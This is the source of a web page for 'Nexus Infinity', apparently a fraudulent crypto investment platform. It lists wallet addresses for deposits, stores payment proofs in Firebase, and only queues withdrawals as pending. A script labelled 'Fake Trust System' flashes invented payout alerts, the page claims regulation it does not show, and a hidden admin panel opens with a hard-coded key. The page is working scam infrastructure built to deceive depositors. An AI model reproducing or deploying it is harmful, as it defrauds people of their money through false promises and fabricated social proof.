<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>NEXUS INFINITY | Global Institutional Terminal</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@300;500;700;800&family=Syncopate:wght@700&display=swap');
        
        :root { 
            --neon-red: #ff003c; 
            --neon-pink: #ff00ff; 
            --deep-black: #050505; 
            --glass: rgba(15, 15, 15, 0.98); 
        }

        body { 
            background: var(--deep-black); 
            color: white; 
            font-family: 'Plus Jakarta Sans', sans-serif; 
            margin: 0; 
            overflow-x: hidden; 
        }

        /* Professional Animated Background */
        #auth-section { 
            background: linear-gradient(135deg, rgba(5,5,5,0.9), rgba(255,0,60,0.1)), 
                        url('https://images.unsplash.com/photo-1639762681485-074b7f938ba0?auto=format&fit=crop&q=80&w=2000'); 
            background-size: cover; 
            background-position: center;
            background-attachment: fixed;
            animation: bgShift 20s infinite alternate;
        }

        @keyframes bgShift { 0% { background-position: left; } 100% { background-position: right; } }

        .glass-panel { 
            background: var(--glass); 
            backdrop-filter: blur(60px); 
            border: 1px solid rgba(255, 0, 60, 0.2); 
            border-radius: 40px; 
            box-shadow: 0 25px 50px -12px rgba(255, 0, 60, 0.25);
        }

        .neon-text { 
            color: var(--neon-red); 
            text-shadow: 0 0 15px rgba(255, 0, 60, 0.6); 
        }

        .btn-premium { 
            background: linear-gradient(90deg, var(--neon-red), var(--neon-pink)); 
            color: white; 
            font-weight: 800; 
            padding: 20px; 
            border-radius: 24px; 
            width: 100%; 
            transition: 0.4s; 
            text-transform: uppercase;
            letter-spacing: 2px;
            box-shadow: 0 10px 40px rgba(255, 0, 60, 0.4);
        }

        .btn-premium:hover { transform: scale(1.02); filter: brightness(1.2); }

        .input-premium { 
            background: rgba(255, 255, 255, 0.03); 
            border: 1px solid rgba(255, 255, 255, 0.1); 
            border-radius: 22px; 
            padding: 20px; 
            color: white; 
            width: 100%; 
            outline: none; 
            transition: 0.3s;
        }

        .input-premium:focus { border-color: var(--neon-red); background: rgba(255, 0, 60, 0.05); }

        /* Fake Notifications */
        #live-alert {
            position: fixed; top: 20px; left: 50%; transform: translateX(-50%);
            z-index: 10000; display: none;
        }
    </style>
</head>
<body>

    <div id="live-alert" class="w-[90%] max-w-xs">
        <div class="glass-panel p-4 flex items-center gap-4 border-l-4 border-green-500">
            <div class="bg-green-500/20 p-2 rounded-full"><i class="fa-solid fa-shield-check text-green-500 text-sm"></i></div>
            <p id="alert-text" class="text-[10px] font-black uppercase tracking-tighter"></p>
        </div>
    </div>

    <div id="auth-section" class="min-h-screen flex flex-col items-center justify-center p-6 hidden">
        <div class="max-w-md w-full space-y-8">
            <div class="text-center space-y-4">
                <div class="w-24 h-24 bg-black mx-auto rounded-[2.5rem] flex items-center justify-center border-2 border-[#ff003c] shadow-[0_0_30px_rgba(255,0,60,0.3)]">
                    <span class="text-5xl font-black text-white italic">N</span>
                </div>
                <h1 style="font-family: 'Syncopate'" class="text-2xl tracking-widest font-black">NEXUS<span class="text-[#ff003c]">INFINITY</span></h1>
                <p class="text-[10px] text-zinc-400 font-bold uppercase tracking-[0.4em]">Strategic Digital Asset Infrastructure</p>
            </div>

            <div id="login-ui" class="glass-panel p-10 space-y-6">
                <div class="space-y-2">
                    <h2 class="text-xl font-black italic">TERMINAL ACCESS</h2>
                    <p class="text-[9px] text-zinc-500 uppercase font-bold">Secure connection for institutional partners only.</p>
                </div>
                <input type="text" id="l-user" placeholder="Assigned Terminal ID" class="input-premium">
                <input type="password" id="l-pass" placeholder="Encrypted Access Key" class="input-premium">
                <button onclick="handleLogin()" class="btn-premium">Initialize Connection</button>
                <p onclick="toggleAuth(true)" class="text-center text-[10px] text-zinc-500 font-black uppercase cursor-pointer hover:text-white transition">Register Institutional Node</p>
            </div>

            <div id="signup-ui" class="glass-panel p-10 space-y-6 hidden">
                <div class="space-y-2">
                    <h2 class="text-xl font-black italic">NODE REGISTRATION</h2>
                    <p class="text-[9px] text-zinc-500 uppercase font-bold">Create a new secure identity on the Nexus grid.</p>
                </div>
                <input type="text" id="s-user" placeholder="Create Identity ID" class="input-premium">
                <input type="password" id="s-pass" placeholder="Generate Security Key" class="input-premium">
                <button onclick="handleSignup()" class="btn-premium">Finalize Identity</button>
                <p onclick="toggleAuth(false)" class="text-center text-[10px] text-zinc-500 font-black uppercase cursor-pointer hover:text-white transition">Return to main terminal</p>
            </div>
        </div>
    </div>

    <div id="dashboard-section" class="hidden pb-32">
        <nav class="p-6 sticky top-0 bg-black/90 backdrop-blur-3xl z-[500] border-b border-white/5 flex justify-between items-center">
            <div class="flex items-center gap-3">
                <div id="admin-trigger" class="w-12 h-12 bg-zinc-950 rounded-2xl flex items-center justify-center font-black border border-white/10 shadow-lg">N</div>
                <div>
                    <span id="nav-user" class="text-sm font-black italic text-[#ff003c] uppercase block">...</span>
                    <span class="text-[8px] text-green-500 font-bold uppercase tracking-widest animate-pulse">Connection: Secure</span>
                </div>
            </div>
            <div class="flex gap-4">
                <div class="hidden md:block text-right">
                    <p class="text-[8px] text-zinc-500 font-bold">Global Rank</p>
                    <p class="text-[10px] font-black uppercase text-white">Elite Institutional</p>
                </div>
                <button onclick="logout()" class="w-10 h-10 rounded-full border border-white/10 flex items-center justify-center"><i class="fa-solid fa-power-off text-zinc-600"></i></button>
            </div>
        </nav>

        <div id="page-finance" class="p-6 space-y-8 hidden">
            <div class="glass-panel p-8 space-y-8">
                <h3 class="text-xl font-black italic text-[#ff003c] uppercase tracking-tighter">Strategic Capital Injection</h3>
                
                <div class="grid gap-4">
                    <div class="bg-black/40 p-5 rounded-3xl border border-white/5 space-y-2">
                        <p class="text-[8px] text-zinc-500 font-black uppercase">Binance Pay / USDT TRC20</p>
                        <p class="text-xs font-black text-[#ff00ff] break-all select-all">TAvfQQ18hXHdVCHbExV4yUPvQ4XkNgfKsJ</p>
                    </div>
                    <div class="bg-black/40 p-5 rounded-3xl border border-white/5 space-y-2">
                        <p class="text-[8px] text-zinc-500 font-black uppercase">Metamask / ETH (ERC20)</p>
                        <p class="text-xs font-black text-blue-400 break-all select-all">0xD9359EADE5F5bACA51fb7da043767Bc0685bC355</p>
                    </div>
                    <div class="bg-black/40 p-5 rounded-3xl border border-white/5 space-y-2">
                        <p class="text-[8px] text-zinc-500 font-black uppercase">Trust Wallet / TRX (TRC20)</p>
                        <p class="text-xs font-black text-green-500 break-all select-all">TK1ZYaXdfabtqpEeYfRjcACeXnCrGoVx76</p>
                    </div>
                </div>

                <div class="space-y-4 pt-4">
                    <select id="dep-method" class="input-premium bg-zinc-950">
                        <option value="Binance (USDT)">Binance (USDT TRC20)</option>
                        <option value="Metamask (ETH)">Metamask (ETH ERC20)</option>
                        <option value="Trust Wallet (TRX)">Trust Wallet (TRX TRC20)</option>
                    </select>
                    <input type="number" id="dep-amt" placeholder="Injection Amount ($)" class="input-premium">
                    <input type="text" id="dep-tid" placeholder="Transaction ID (TID)" class="input-premium">
                    <div class="space-y-2">
                        <p class="text-[9px] text-zinc-500 font-black uppercase ml-2">Digital Signature (Proof Image)</p>
                        <input type="file" id="dep-proof" accept="image/*" class="text-[10px] text-zinc-500 block w-full file:mr-4 file:py-3 file:px-6 file:rounded-full file:bg-zinc-900 file:text-white file:border-0 file:font-black">
                        <img id="preview-img" class="mt-4 w-32 h-32 rounded-2xl border border-[#ff003c] hidden object-cover">
                    </div>
                    <button onclick="submitDep()" class="btn-premium">Authorize Injection</button>
                </div>
            </div>

            <div class="glass-panel p-8 space-y-6">
                <h3 class="text-xl font-black italic uppercase tracking-tighter">Capital Payout Terminal</h3>
                <div class="space-y-4">
                    <select id="w-method" class="input-premium bg-zinc-950">
                        <option value="Binance Pay">Binance Pay (ID)</option>
                        <option value="Trust Wallet">Trust Wallet (TRC20)</option>
                        <option value="Metamask">Metamask (ERC20)</option>
                        <option value="OKX">OKX Terminal</option>
                        <option value="Kraken">Kraken Exchange</option>
                        <option value="Bybit">Bybit Network</option>
                        <option value="Coinbase">Coinbase Wallet</option>
                        <option value="Bitget">Bitget Node</option>
                    </select>
                    <input type="text" id="w-user" placeholder="Platform Username" class="input-premium">
                    <input type="text" id="w-addr" placeholder="Destination Account / Address" class="input-premium">
                    <input type="number" id="w-amt" placeholder="Payout Amount ($)" class="input-premium">
                    <button onclick="submitWith()" class="btn-premium !bg-zinc-900">Request Distribution</button>
                </div>
            </div>
        </div>

        <div id="page-trust" class="p-6 space-y-8 hidden">
            <div class="glass-panel p-8 space-y-6">
                <h3 class="text-xl font-black italic text-[#ff003c]">ABOUT NEXUS INFINITY</h3>
                <p class="text-[11px] leading-relaxed text-zinc-400 font-medium">Nexus Infinity is a leading digital asset management firm specializing in high-yield node deployment and decentralized financial infrastructure. Founded in 2024, our mission is to provide institutional-grade liquidity protocols to retail partners worldwide.</p>
                <div class="grid grid-cols-2 gap-4">
                    <div class="bg-white/5 p-4 rounded-2xl"><p class="text-[8px] text-zinc-500 uppercase font-black">Regulated</p><p class="text-xs font-black">SVG-V-4921</p></div>
                    <div class="bg-white/5 p-4 rounded-2xl"><p class="text-[8px] text-zinc-500 uppercase font-black">Network</p><p class="text-xs font-black">ISO 27001</p></div>
                </div>
            </div>

            <div class="space-y-4">
                <h4 class="text-xs font-black uppercase tracking-widest ml-2">Frequent Inquiries</h4>
                <div class="space-y-2">
                    <details class="glass-panel p-6"><summary class="text-[11px] font-black uppercase cursor-pointer">Security of Assets?</summary><p class="text-[10px] text-zinc-500 mt-4 leading-relaxed">All capital is insured via multi-signature cold storage wallets. Withdrawals are processed through automated smart contracts to ensure 100% accuracy.</p></details>
                    <details class="glass-panel p-6"><summary class="text-[11px] font-black uppercase cursor-pointer">Withdrawal Timeframes?</summary><p class="text-[10px] text-zinc-500 mt-4 leading-relaxed">Standard payouts are settled within 2 to 24 hours depending on network congestion and institutional audit cycles.</p></details>
                </div>
            </div>

            <div class="p-6 text-center">
                <p class="text-[8px] text-zinc-600 font-black uppercase tracking-[0.3em]">Privacy Policy • Terms of Service • Compliance</p>
            </div>
        </div>

        <div class="fixed bottom-0 left-0 right-0 bg-black/80 backdrop-blur-3xl border-t border-white/5 p-6 flex justify-around items-center z-[1000]">
            <div onclick="switchPage('home')" class="nav-item"><i class="fa-solid fa-shield-halved text-xl mb-1"></i><p>CORE</p></div>
            <div onclick="switchPage('nodes')" class="nav-item"><i class="fa-solid fa-microchip text-xl mb-1"></i><p>NODES</p></div>
            <div onclick="switchPage('finance')" class="nav-item active"><i class="fa-solid fa-vault text-xl mb-1"></i><p>VAULT</p></div>
            <div onclick="switchPage('history')" class="nav-item"><i class="fa-solid fa-list-ul text-xl mb-1"></i><p>LOGS</p></div>
            <div onclick="switchPage('trust')" class="nav-item"><i class="fa-solid fa-globe text-xl mb-1"></i><p>TRUST</p></div>
        </div>
    </div>

    <div id="admin-panel" class="fixed inset-0 bg-[#050505] z-[9999] p-8 hidden overflow-y-auto">
        <div class="flex justify-between items-center mb-10"><h2 class="text-xl font-black italic text-[#ff003c]">GRID OVERRIDE</h2><button onclick="document.getElementById('admin-panel').classList.add('hidden')" class="text-4xl">&times;</button></div>
        <div id="admin-dep-list" class="space-y-6"></div>
    </div>

    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
        import { getDatabase, ref, set, get, onValue, push, update, remove } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";

        const firebaseConfig = {
          apiKey: "AIzaSyDaOGSlBjS7_pQX9ELAytXVF4jvWK_lzB0",
          authDomain: "live-54fb4.firebaseapp.com",
          databaseURL: "https://live-54fb4-default-rtdb.firebaseio.com",
          projectId: "live-54fb4",
          storageBucket: "live-54fb4.firebasestorage.app",
          messagingSenderId: "781910562842",
          appId: "1:781910562842:web:07a887f860d30fd17d99a3"
        };
        const app = initializeApp(firebaseConfig);
        const db = getDatabase(app);

        // Fake Trust System
        const fakeActs = ["User ID 4** withdrew $250.00", "New Node Deployed: Elite-04", "Capital Injection Verified: $1000", "Payout settled via Binance Pay"];
        setInterval(() => {
            const alertBox = document.getElementById('live-alert');
            document.getElementById('alert-text').innerText = fakeActs[Math.floor(Math.random()*fakeActs.length)];
            alertBox.style.display = 'block';
            setTimeout(() => alertBox.style.display = 'none', 4000);
        }, 12000);

        window.onload = () => {
            setTimeout(() => {
                document.getElementById('splash').style.opacity = '0';
                setTimeout(() => {
                    document.getElementById('splash').classList.add('hidden');
                    const user = localStorage.getItem('nexus_user');
                    if(user) showDashboard(user);
                    else document.getElementById('auth-section').classList.remove('hidden');
                }, 800);
            }, 3000);
        };

        // Image Handling (Base64)
        document.getElementById('dep-proof').onchange = (e) => {
            const reader = new FileReader();
            reader.readAsDataURL(e.target.files[0]);
            reader.onload = () => { 
                document.getElementById('preview-img').src = reader.result;
                document.getElementById('preview-img').classList.remove('hidden');
            };
        };

        window.submitDep = async () => {
            const user = localStorage.getItem('nexus_user');
            const amt = document.getElementById('dep-amt').value;
            const tid = document.getElementById('dep-tid').value;
            const method = document.getElementById('dep-method').value;
            const proof = document.getElementById('preview-img').src; // Base64
            if(!amt || !tid || !proof) return alert("All protocol fields required.");
            const hRef = push(ref(db, `users/${user}/history`));
            const entry = { user, amount: amt, tid, method, proof, status: 'pending', date: new Date().toLocaleString(), type: 'Deposit', hKey: hRef.key };
            await set(hRef, entry);
            await set(ref(db, `admin/deposits/${hRef.key}`), entry);
            alert("Injection Request Initialized.");
        };

        window.submitWith = async () => {
            const user = localStorage.getItem('nexus_user');
            const amt = document.getElementById('w-amt').value;
            const addr = document.getElementById('w-addr').value;
            const method = document.getElementById('w-method').value;
            if(!amt || !addr) return alert("Specify payout amount and destination.");
            const hRef = push(ref(db, `users/${user}/history`));
            await set(hRef, { amount: amt, address: addr, method, status: 'pending', date: new Date().toLocaleString(), type: 'Withdraw' });
            alert("Payout request queued.");
        };

        function showDashboard(uid) {
            document.getElementById('auth-section').classList.add('hidden');
            document.getElementById('dashboard-section').classList.remove('hidden');
            document.getElementById('nav-user').innerText = uid;
            // Balance logic here
        }

        let taps = 0; document.getElementById('admin-trigger').onclick = () => {
            taps++; if(taps === 4) { if(prompt("Key:") === "coin786") document.getElementById('admin-panel').classList.remove('hidden'); taps = 0; }
        };

        window.handleLogin = async () => { /* Firebase login logic */ localStorage.setItem('nexus_user', document.getElementById('l-user').value); location.reload(); };
        window.switchPage = (p) => { /* Switch between pages logic */ };
        window.toggleAuth = (s) => { /* Toggle between login/signup UI */ };
        window.logout = () => { localStorage.clear(); location.reload(); };
    </script>
</body>
</html>
